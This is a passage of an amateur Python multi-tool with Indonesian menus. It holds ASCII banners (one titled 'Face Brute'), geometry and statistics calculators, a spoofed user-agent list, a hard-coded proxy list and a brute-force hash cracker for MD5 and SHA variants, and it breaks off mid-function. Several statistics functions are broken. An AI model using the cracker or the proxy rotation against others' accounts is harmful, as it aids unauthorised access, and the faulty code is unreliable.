#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import math , requests , os , time , datetime , re , json , string , random , hashlib , sys , threading
from urllib.request import Request, urlopen
from bs4 import BeautifulSoup
from string import *

W  = '\033[0m'  # white (default)
R  = '\033[1;31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[1;33m' # orange
B  = '\033[1;34m' # blue
P  = '\033[1;35m' # purple
C  = '\033[1;36m' # cyan
GR = '\033[1;37m' # gray

def banner():
    os.system('clear')
    print (O+'                         _    '+W+'          ________________________')
    print (O+'  ,-.      __,---.__   ,\',`\  '+W+'          |                      |')
    print (O+' / `.`. ,-\'         `-/ /   ) '+W+'  ________| '+C+'hEllO, L4zy pe0ple!!'+W+' |')
    print (O+'(    `,\'             _ \   ;  '+W+' /        |______________________|')
    print (O+' \  _( _           ,\'  )/  : '+W+'_/                                 ')
    print (O+'  \ `-( `-.      ,\'    /  /                            '+G+' v.5.8  ')
    print (O+'   \   \ __`.___/_,-( /_,\' '+R+'_    ____ ___  _  _ ____ _  _ _ ____ ')
    print (O+'    `--\'`,\_o,(_)o_,\',     '+R+'|    |__|   /  |\/| |__| |\ | | |__| ')
    print (O+'        (    /`-\'\    )    '+R+'|___ |  |  /__ |  | |  | | \| | |  | ')
    print (O+'         `--:\,m//`--\'                                               ')
    print (O+'             `--\'          '+GR+'https://github.com/N1ght420         ')

def bannerbr():
    os.system('clear')
    print (W+'       ,   ,    ')
    print ('      /////|    ')
    print ('     ///// |    ')
    print ('    |~~~|  |    ')
    print ('    |===|  |    '+C+'Brainly Answer Seeker '+O+'v.1.5'+W)
    print ('    |   |  |    '+GR+'https://github.com/N1ght420'+W)
    print ('    |   |  |    ')
    print ('    |   | /     ')
    print ('    |===|/      ')
    print ('    \'---\'       ')
    print ('')

def bannerfb():
    os.system('clear')
    print ('')
    print (B+'███████'+W+'▄▄███████████▄')
    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╔═╗┌─┐┌─┐┌─┐')
    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.3.0')
    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╚  ┴ ┴└─┘└─┘')
    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╔╗ ┬─┐┬ ┬┌┬┐┌─┐')
    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╠╩╗├┬┘│ │ │ ├┤ ')
    print (B+'▓▓▓▓▓▓█'+W+'██            █'+G+'        ╚═╝┴└─└─┘ ┴ └─┘')
    print (B+'██████▀'+W+'  █    ██████▀    _________________________')
    print (W+'         █    █')
    print (W+'          █   █')
    print (W+'           █  █             github.com/N1ght420')
    print (W+'           █  █')
    print (W+'            ▀▀')
    print ('')

def bannerlk():
    os.system('clear')
    print (R+'██████████████████████████████████████'+C+'═╗')
    print ('╚═══════════════════════════════════'+R+'██'+C+' ║'+R)
    print ('                                    ██'+C+' ║'+W)
    print (W+'    ██╗     ██╗  ██╗██████╗  ██╗    '+R+'██'+C+' ║'+W)
    print (W+'    ██║     ██║ ██╔╝╚════██╗███║    '+R+'██'+C+' ║'+W)
    print (W+'    ██║     █████╔╝  █████╔╝╚██║    '+R+'██'+C+' ║'+W)
    print (W+'    ██║     ██╔═██╗ ██╔═══╝  ██║    '+R+'██'+C+' ║'+W)
    print (W+'    ███████╗██║  ██╗███████╗ ██║    '+R+'██'+C+' ║'+W)
    print (W+'    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═╝    '+R+'██'+C+' ║'+R)
    print ('                                    ██'+C+' ║'+R)
    print ('██████████████████████████████████████'+C+' ║')
    print ('╚══════════════════════════════════════╝')
    print (W+'')

def bannerlk_dl():
    os.system('clear')
    print (R+'██████████████████████████████████████'+C+'═╗')
    print ('╚═══════════════════════════════════'+R+'██'+C+' ║'+R)
    print ('                                    ██'+C+' ║')
    print (W+'    ██╗     ██╗  ██╗██████╗  ██╗    '+R+'██'+C+' ║  ═════════════════════════════')
    print (W+'    ██║     ██║ ██╔╝╚════██╗███║    '+R+'██'+C+' ║'+W)
    print (W+'    ██║     █████╔╝  █████╔╝╚██║    '+R+'██'+C+' ║'+W+'   ', time.ctime())
    print (W+'    ██║     ██╔═██╗ ██╔═══╝  ██║    '+R+'██'+C+' ║'+W+'    https://layarkaca21.vip')
    print (W+'    ███████╗██║  ██╗███████╗ ██║    '+R+'██'+C+' ║'+W)
    print (W+'    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═╝    '+R+'██'+C+' ║  ═════════════════════════════'+R)
    print ('                                    ██'+C+' ║'+W+'   https://github.com/N1ght420'+R)
    print ('██████████████████████████████████████'+C+' ║')
    print ('╚══════════════════════════════════════╝')
    print (W+'')

def bannerapk():
    os.system('clear')
    print (R+'     .')
    print (R+'   .:;:.   '+C+'     .     ')
    print (R+' .:;;;;;:. '+C+'       .  '+W+'  @@@@@@  @@@@@@@  @@@  @@@  ')
    print (R+'   ;;;;;   '+C+'   . ;.   '+W+' @@!  @@@ @@!  @@@ @@!  !@@  ')
    print (R+'   ;;;;;   '+C+'    .;    '+W+' @!@!@!@! @!@@!@!  @!@@!@!   ')
    print (R+'   ;;;;;   '+C+'     ;;.  '+W+' !!:  !!! !!:      !!: :!!   ')
    print (R+'   ;;;;;   '+C+'   ;.;;   '+W+'  :   : :  :        :   :::  ')
    print (R+'   ;:;;;   '+C+'   ;;;;.   ')
    print (R+'   : ;;;   '+C+'   ;;;;;  '+W+'      @@@@@@@   @@@@@@  @@@  @@@  @@@ @@@  @@@ ')
    print (R+'     ;:;   '+C+'   ;;;;;  '+W+'      @@!  @@@ @@!  @@@ @@!  @@!  @@! @@!@!@@@ ')
    print (R+'   . :.;   '+C+'   ;;;;;  '+W+'      @!@  !@! @!@  !@! @!!  !!@  @!@ @!@@!!@! ')
    print (R+'     . :   '+C+'   ;;;;;  '+W+'      !!:  !!! !!:  !!!  !:  !!:  !!  !!:  !!! ')
    print (R+'   .   .   '+C+'   ;;;;;  '+W+'      :: :  :   : :. :    ::.:  :::   ::    :  ')
    print (R+'           '+C+' ..;;;;;.. ')
    print (R+'      .    '+C+'  \':::::\' '+GR+'               https://github.com/karjok')
    print (R+'           '+C+'    \':`    '+W)
    print ('')

ua = [
   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
]

prox = [
    'http://10.10.1.10:3128',
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080',
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281',
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128',
    'http://62.210.105.103:3128',
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080',
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80',
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80',
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80',
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080',
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080',
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080',
    'http://36.72.127.182:8080',
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080',
    'http://35.196.159.241:80',
    'http://27.122.224.183:80',
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080',
    'http://223.205.121.223:8080',
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080',
    'http://217.61.15.26:80',
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080',
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080',
]

def prima():
    num = int(input(C+' Masukkan Bilangan '+R+'> '+W))
    if num > 1:
        for i in range(2,num):
            if (num % i) == 0:
                print (C+' Angka'+W, num ,R+'Bukan Bilangan Prima'+W)
                print (C+' Karena'+W, i ,C+'Dikali'+W, num//i ,R+'='+W, num)
                break
        else:
            print (C+' Angka'+W, num ,C+'Adalah Bilangan Prima'+W)

    else:
        print (C+' Angka'+W, num ,R+'Bukan Bilangan Prima'+W)

def fakt(x):
    print ('')
    print (C+' Faktor Dari'+W, x ,C+'Adalah'+W)
    for i in range(1, x+1):
        if x % i == 0:
            print (' ', i)

def faktor():
    num = int(input(C+' Masukkan Bilangan '+R+'> '+W))
    fakt(num)

def mean():
    data = int(input(C+' Masukkan Data '+R+'> '+W))
    a = str(round(sum(data) / len(data), 2))
    print(C+' Mean '+R+'>'+W, a)

def median():
    data = int(input(C+' Masukkan Data '+R+'> '+W))
    data.sort()
    if len(data) % 2 == 0:
        a = int(len(data) / 2)
        b = (data[a - 1] + data[a]) / 2
        median = str(b)

    else:
        a = int((len(data) + 1) / 2)
        median = str(data[a - 1])
        
    print(C+' Median '+R+'>'+W, median)

def modus():
    data = int(input(C+' Masukkan Data '+R+'> '+W))
    modus = max(set(data), key=data.count)
    a = data.count(modus)
    b = []
    for i in data:
        if a - 1 < data.count(i):
            b.append(i)
    c = b[::a]
    modus1 = 'Modus data adalah '
    modus2 = []
    if len(c) == 1:
        modus1 += str(c[0])
    else:
        for i in c:
            modus2.append(str(i))
        modus1 += ' & '.join(modus2)
    
    print(C+' Modus '+R+'>'+W, modus)

def keliling_persegi () :
    x= float(input(C+' Sisi '+R+'> '+W))
    keliling = 4*x
    print (' ' )
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)
    
def luas_kubik () :
	x=float(input(C+' Sisi'+R+'> '+W))
	luas= 6*x*x
	print (' ' )
	print (C+' Luas'+R+'>'+W, luas ,C+'cm2'+W)
    
def keliling_persegipanjang () :
    x= float(input(C+' Panjang '+R+'> '+W))
    y= float(input(C+' Lebar '+R+'> '+W))
    keliling = 2*(x+y)
    print (' ' )
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)
    
def luas_balok () :
	x= float(input(C+' Panjang '+R+'> '+W))
	y= float(input(C+' Lebar '+R+'> '+W))
	z= float(input(C+' Tinggi '+R+'> '+W))
	luas= 2*((x*y)+(x*z)+(y*z))
	print (' ' )
	print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
    
def volume_limas () :
	x= float(input(C+' Luas Alas '+R+'> '+W))
	y= float(input(C+' Tinggi '+R+'> '+W))
	volume = 1/3*x*y
	print (' ' )
	print (C+' Volume '+R+'>'+W, volume ,C+'cm3'+W)
	
def keliling_segitiga () :
    ab= float(input(C+' Panjang AB '+R+'> '+W))
    bc= float(input(C+' Panjang BC '+R+'> '+W))
    ca= float(input(C+' Panjang CA '+R+'> '+W))
    keliling = ab+bc+ca
    print (' ' )
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)

def luas_bola () :
	x = float(input(C+' Jari Jari '+R+'> '+W))
	luas = 4*22/7*x*x
	print ('')
	print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
              
def keliling_jajargenjang () :
    ab= float(input(C+' Panjang AB '+R+'> '+W))
    bc= float(input(C+' Panjang BC '+R+'> '+W))
    cd= float(input(C+' Panjang CD '+R+'> '+W))
    da= float(input(C+' Panjang DA '+R+'> '+W))
    keliling = ab+bc+cd+da
    print ('')
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)

def keliling_trapesium () :
    ab= float(input(C+' Panjang AB '+R+'> '+W))
    bc= float(input(C+' Panjang BC '+R+'> '+W))
    cd= float(input(C+' Panjang CD '+R+'> '+W))
    da= float(input(C+' Panjang DA '+R+'> '+W))
    keliling = ab+bc+cd+da
    print ('')
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)
             
def keliling_ketupat () :
    z= float(input(C+' Sisi '+R+'> '+W))
    keliling = 4*z
    print ('')
    print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)
    
def keliling_layang () :
	ab= float(input(C+' Panjang AB '+R+'> '+W))
	bc= float(input(C+' Panjang BC '+R+'> '+W))
	keliling = 2*(ab+bc)
	print (' ' )
	print (C+' Keliling '+R+'>'+W, keliling ,C+'cm'+W)


def luas_persegi () :
    x= float(input(C+' Sisi '+R+'> '+W))
    luas= x*x
    print (' ' )
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
    
def volume_kubik () :
    x=float(input(C+' Sisi '+R+'> '+W))
    volume= x*x*x
    print (' ' )
    print (C+' Volume '+R+'>'+W, volume ,C+'cm3'+W)
    
def luas_persegipanjang () :
    x= float(input(C+' Panjang'+R+'> '+W))
    y= float(input(C+' Lebar'+R+'> '+W))
    luas= x*y
    print (' ' )
    print (C+' Luas'+R+'>'+W, luas ,C+'cm2'+W)
    
def volume_balok () :
    x= float(input(C+' Panjang '+R+'> '+W))
    y= float(input(C+' Lebar '+R+'> '+W))
    z= float(input(C+' Tinggi '+R+'> '+W))
    volume= x*y*z
    print (' ' )
    print (C+' Volume '+R+'>'+W, volume ,C+'cm3'+W)
    
def luas_segitiga () :
    x= float(input(C+' Alas '+R+'> '+W))
    y= float(input(C+' Tinggi '+R+'> '+W))
    luas=0.5*x*y
    print (' ' )
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)

def luas_lingkaran () :
    x = float(input(C+' Jari Jari '+R+'> '+W))
    luas = 22/7*x*x
    print ('')
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)

def volume_bola () :
    x = float(input(C+' Jari Jari '+R+'> '+W))
    volume = 4/3*22/7*x*x*x
    print ('')
    print (C+' Volume '+R+'>'+W, volume ,C+'cm3'+W)
              
def luas_jajargenjang () :
    x= float(input(C+' Tinggi '+R+'> '+W))
    y= float(input(C+' Alas '+R+'> '+W))
    luas = x*y
    print ('')
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)

def luas_trapesium () :
    x= float(input(C+' Sisi Atas '+R+'> '+W))
    y= float(input(C+' Sisi Bawah '+R+'> '+W))
    z= float(input(C+' Tinggi '+R+'> '+W))
    luas = (x+y)*z/2
    print ('')
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
             
def luas_ketupat () :
    x= float(input(C+' Diagonal 1 '+R+'> '+W))
    y= float(input(C+' Diagonal 2 '+R+'> '+W))
    luas = 0.5*x*y
    print ('')
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
    
def luas_layang () :
    x= float(input(C+' Diagonal 1 '+R+'> '+W))
    y= float(input(C+' Diagonal 2 '+R+'> '+W))
    luas = 0.5*x*y
    print (' ' )
    print (C+' Luas '+R+'>'+W, luas ,C+'cm2'+W)
	
def medus() :      
    print ('')
    print (C+' 01'+R+'  :'+W+'  Mean')
    print (C+' 02'+R+'  :'+W+'  Median')
    print (C+' 03'+R+'  :'+W+'  Modus')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/3M'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        mean()
    elif cmd == '02' or cmd == '2' :
        banner()
        median()
    elif cmd == '03' or cmd == '3' :
        banner()
        modus()
    elif cmd == '00' or cmd == '0' :
        banner()
        mathtool()
    elif cmd == '99' :
        exit()
    else :
        banner()
        medus()

def persegi():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Persegi')
    print (C+' 02'+R+'  :'+W+'  Luas Persegi')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Persegi'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_persegi()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_persegi()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        persegi()

def persegipanjang():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Persegi Panjang')
    print (C+' 02'+R+'  :'+W+'  Luas Persegi Panjang')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Persegipanjang'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_persegipanjang()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_persegipanjang()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        persegipanjang()

def layang():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Layang Layang')
    print (C+' 02'+R+'  :'+W+'  Luas Layang Layang')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Layang'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_layang()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_layang()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        layang()

def ketupat():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Belah Ketupat')
    print (C+' 02'+R+'  :'+W+'  Luas Belah Ketupat')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Ketupat'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_ketupat()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_ketupat()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        ketupat()

def trapesium():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Trapesium')
    print (C+' 02'+R+'  :'+W+'  Luas Trapesium')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Trapesium'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_trapesium()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_trapesium()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        trapesium()

def jajargenjang():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Jajar Genjang')
    print (C+' 02'+R+'  :'+W+'  Luas Jajar Genjang')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Jajargenjang'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_jajargenjang()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_jajargenjang()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        jajargenjang()

def segitiga():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Segitiga')
    print (C+' 02'+R+'  :'+W+'  Luas Segitiga')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Segitiga'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        keliling_segitiga()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_segitiga()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        segitiga()

def lingkaran():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Lingkaran')
    print (C+' 02'+R+'  :'+W+'  Luas Lingkaran')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar/Lingkaran'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        betaprogram()
    elif cmd == '02' or cmd == '2' :
        banner()
        luas_lingkaran()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangundatar()
    elif cmd == '99' :
        exit()
    else :
        banner()
        lingkaran()

def bola():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Bola')
    print (C+' 02'+R+'  :'+W+'  Volume Bola')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Ruang/Bola'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        betaprogram()
    elif cmd == '02' or cmd == '2' :
        banner()
        volume_bola()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangunruang()
    elif cmd == '99' :
        exit()
    else :
        banner()
        bola()

def balok():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Balok')
    print (C+' 02'+R+'  :'+W+'  Volume Balok')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Ruang/Balok'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        betaprogram()
    elif cmd == '02' or cmd == '2' :
        banner()
        volume_balok()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangunruang()
    elif cmd == '99' :
        exit()
    else :
        banner()
        balok()

def kubik():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Kubik')
    print (C+' 02'+R+'  :'+W+'  Volume Kubik')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Ruang/Kubik'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        betaprogram()
    elif cmd == '02' or cmd == '2' :
        banner()
        volume_kubik()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangunruang()
    elif cmd == '99' :
        exit()
    else :
        banner()
        kubik()

def limas():
    print ('')
    print (C+' 01'+R+'  :'+W+'  Keliling Limas')
    print (C+' 02'+R+'  :'+W+'  Volume Limas')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Ruang/Limas'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        betaprogram()
    elif cmd == '02' or cmd == '2' :
        banner()
        volume_limas()
    elif cmd == '00' or cmd == '0' :
        banner()
        pilbangunruang()
    elif cmd == '99' :
        exit()
    else :
        banner()
        limas()

def pilbangundatar() :		
    print ('')
    print (C+' 01'+R+'  :'+W+'  Persegi')
    print (C+' 02'+R+'  :'+W+'  Persegi Panjang')
    print (C+' 03'+R+'  :'+W+'  Segitiga')
    print (C+' 04'+R+'  :'+W+'  Lingkaran')
    print (C+' 05'+R+'  :'+W+'  Jajar Genjang')
    print (C+' 06'+R+'  :'+W+'  Trapesium')
    print (C+' 07'+R+'  :'+W+'  Belah Ketupat')
    print (C+' 08'+R+'  :'+W+'  Layang Layang')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Datar'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        persegi()
    elif cmd == '02' or cmd == '2' :
        banner()
        persegipanjang()
    elif cmd == '03' or cmd == '3' :
        banner()
        segitiga()
    elif cmd == '04' or cmd == '4' :
        banner()
        lingkaran()
    elif cmd == '05' or cmd == '5' :
        banner()
        jajargenjang()
    elif cmd == '06' or cmd == '6' :
        banner()
        trapesium()
    elif cmd == '07' or cmd == '7' :
        banner()
        ketupat()
    elif cmd == '08' or cmd == '8' :
        banner()
        layang()
    elif cmd == '00' or cmd == '0' :
        banner()
        math()
    elif cmd == '99' :
        exit()
    else :
        banner()
        pilbangundatar()

def pilbangunruang() :      
    print ('')
    print (C+' 01'+R+'  :'+W+'  Kubik')
    print (C+' 02'+R+'  :'+W+'  Balok')
    print (C+' 03'+R+'  :'+W+'  Limas')
    print (C+' 04'+R+'  :'+W+'  Bola')
    print ('')
    print (C+' 00'+R+'  :'+W+'  Back')
    print (C+' 99'+R+'  :'+W+'  Exit')
    print ('')
    cmd = str(input(W+' Menu/Math/Ruang'+R+' > '+W))
    if cmd == '01' or cmd == '1' :
        banner()
        kubik()
    elif cmd == '02' or cmd == '2' :
        banner()
        balok()
    elif cmd == '03' or cmd == '3' :
        banner()
        limas()
    elif cmd == '04' or cmd == '4' :
        banner()
        bola()
    elif cmd == '00' or cmd == '0' :
        banner()
        math()
    elif cmd == '99' :
        exit()
    else :
        banner()
        pilbangunruang()

ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

string_list = ascii_letters

def generateHashFromString(hashMethod, cleartextString):
    if hashMethod == 'md5':
        return hashlib.md5(cleartextString.encode()).hexdigest()
    
    elif hashMethod == 'sha1':
        return hashlib.sha1(cleartextString.encode()).hexdigest()
    
    elif hashMethod == 'sha224':
        return hashlib.sha224(cleartextString.encode()).hexdigest()
    
    elif hashMethod == 'sha256':
        return hashlib.sha256(cleartextString.encode()).hexdigest()
    
    elif hashMethod == 'sha384':
        return hashlib.sha384(cleartextString.encode()).hexdigest()
    
    elif hashMethod == 'sha512':
        return hashlib.sha512(cleartextString.encode()).hexdigest()
    else:
        pass

def reverseString(string):
    return string[::-1]

def IndexErrorCheck(index_input):
    if len(string_list) <= index_input:
        pass
    else:
        return string_list[index_input]

def StringGenerator(string):
    if len(string) <= 0:
        string.append(string_list[0])
    else:
        # error checking needs to be done, otherwise a ValueError will raise
        string[0] = IndexErrorCheck((string_list.index(string[0]) + 1) % len(string_list))
        if string_list.index(string[0]) == 0:
            return [string[0]] + StringGenerator(string[1:])
    return string

def demd5():
    hashMethod = 'md5'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def desha1():
    hashMethod = 'sha1'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
        
        if generateHashFromString(hashMethod, formatted_string)  == stringToBeCracked:
            print(C+' String '+R+'>'+W+' {}'.format(formatted_string))
            main()

def desha224():
    hashMethod = 'sha224'
    stringToBeCracked = str(input(C+' Input Hash '+R+'> '+W))
    generated_string = []
    
    while True:
        generated_string = StringGenerator(generated_string)
        formatted_string = reverseString(''.join(generated_string))
